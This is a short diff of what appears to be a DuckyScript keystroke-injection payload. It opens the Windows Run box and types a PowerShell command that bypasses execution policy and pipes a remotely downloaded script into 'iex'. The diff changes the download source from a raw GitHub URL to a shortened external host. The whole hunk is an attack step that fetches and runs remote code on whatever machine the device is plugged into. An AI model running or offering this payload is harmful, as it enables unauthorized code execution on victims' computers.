@@ -10,6 +10,6 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex
+STRING powershell -NoP -Ep Bypass -C irm https://bw0.cc/lant | iex
 ENTER
 
